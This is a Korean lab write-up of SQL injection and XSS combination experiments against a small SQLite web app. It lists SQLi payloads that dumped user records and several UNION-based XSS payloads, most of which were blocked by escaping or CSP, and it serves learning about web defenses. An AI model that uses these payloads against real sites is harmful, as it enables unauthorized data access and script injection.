# SQL Injection & XSS 결합 공격 실험 Write-up

## 1. 실험 개요
- 본 실험은 간단한 SQLite 기반 웹 환경에서 SQL Injection(이하 SQLi) 및 XSS(크로스사이트 스크립팅) 결합 공격의 가능성과 한계를 검증하기 위해 진행되었습니다.
- 주요 목표는 SQLi를 통해 DB 쿼리를 우회하거나, XSS 페이로드를 삽입하여 클라이언트 측 코드 실행을 유도하는 것입니다.
<img width="396" height="88" alt="image" src="https://github.com/user-attachments/assets/f437b391-9f5d-43d3-947f-ecdc5abeaf6b" />

---

## 2. SQL Injection 기본 공격

### 2-1. 단순 SQLi 시도
- **입력값:**
  ```sql
  ' OR 1=1 --
  ```
- **결과:**
  - 아래와 같이 2개의 사용자 정보가 노출됨
    - ID: 1, Username: soap, Password: soap, Role: guest
    - ID: 2, Username: aa, Password: aa, Role: guest
      <img width="442" height="104" alt="image" src="https://github.com/user-attachments/assets/ff0d2001-a9d9-4373-b8f4-75db582d2b6e" />


### 2-2. 에러 기반 SQLi 시도
- **입력값:**
  ```sql
  ' UNION SELECT null, version() --
  ```
- **결과:**
  - 에러 발생: `sqlite3.OperationalError: no such function: version`
  - Error: (sqlite3.OperationalError) no such function: version [SQL: SELECT * FROM user WHERE username = '' UNION SELECT null, version() --' AND username != 'admin'] (Background on this error at: https://sqlalche.me/e/20/e3q8)
- **분석:**
  - SQLite에는 `version()` 함수가 없어 에러 발생
  - 원래 SQL 문은 SELECT * FROM user WHERE username = '' AND username != 'admin

### 2-3. 컬럼 수 파악
- **입력값:**
  ```sql
  ' ORDER BY 1 --
  ' ORDER BY 2 --
  ' ORDER BY 3 --
  ' ORDER BY 4 --
  ' ORDER BY 5 --
  ```
- **결과:**
  - 5에서 에러 발생 → 4개 컬럼 존재 확인
- **분석:**
  - username을 받아와서 검색하며, username이 'admin'이 아닌 경우만 조회

---

## 3. SQLi + XSS 결합 공격 시도

### 3-1. 직접 `<script>` 삽입
- **페이로드:**
  ```sql
  ' UNION SELECT 1, '<script>alert(1)</script>', 'x', 'x' --
  ```
- **결과:**
  - HTML에는 보이나, 스크립트 실행되지 않음
- **원인:**
  - 브라우저 보안 정책(escape 렌더링, innerHTML 미사용 등)

### 3-2. ASCII 인코딩(char()) 기반 XSS
- **페이로드:**
  ```sql
  ' UNION SELECT 1, char(60,115,99,...), 'x', 'x' --
  ```
- **결과:**
  - 디코딩 결과 `<script>alert(1)</script>`가 HTML에 노출되나, 실행되지 않음
- **원인:**
  - 템플릿 자동 escape 또는 text 렌더링

### 3-3. 이벤트 기반 XSS (`<img src=x onerror=alert(1)>`)
- **페이로드:**
  ```sql
  ' UNION SELECT 1, '<img src=x onerror=alert(1)>', 'x', 'x' --
  ```
- **결과:**
  - 그대로 출력, 실행 안 됨
- **원인:**
  - escape된 HTML이 텍스트로 처리됨

### 3-4. Script-less XSS (`<svg onload=alert(1)>`)
- **페이로드:**
  ```sql
  ' UNION SELECT 1, '<svg onload=alert(1)>', 'x', 'x' --
  ```
- **결과:**
  - HTML 노출, 실행 안 됨
- **원인:**
  - escape 처리됨

### 3-5. 구조 깨기 시도 (`</li><script>alert(1)</script><li>`)
- **페이로드:**
  ```sql
  ' UNION SELECT 1, '</li><script>alert(1)</script><li>', 'x', 'x' --
  ```
- **결과:**
  - 페이지 렌더링 중 서버 다운/멈춤
- **원인:**
  - 서버측 필터 또는 파서 오류로 인한 crash

### 3-6. data: URI 기반 iframe 삽입
- **페이로드:**
  ```sql
  ' UNION SELECT 1, '<iframe src="data:text/html;base64,PHNj...">', 'x', 'x' --
  ```
- **결과:**
  - iframe 삽입되나, 실행 안 됨
- **원인:**
  - 렌더러 또는 CSP에 의해 차단

### 3-7. HTML Entity 우회
- **페이로드:**
  ```sql
  ' UNION SELECT 1, '&lt;img src=x onerror=alert(1)&gt;', 'x', 'x' --
  ```
- **결과:**
  - 이중 디코딩 안 됨, 공격 실패
- **원인:**
  - 단일 디코딩만 수행됨

---

## 4. 결론 및 시사점
- SQLi 자체는 비교적 쉽게 성공하였으나, XSS 결합 공격은 서버/클라이언트의 escape 처리, 브라우저 보안 정책 등으로 인해 대부분 실패함.
- 서버 렌더링 방식, 템플릿 엔진의 escape 정책, CSP 등 다양한 보안 요소가 결합되어 있어, 단순 페이로드 삽입만으로는 XSS가 쉽지 않음을 확인함.
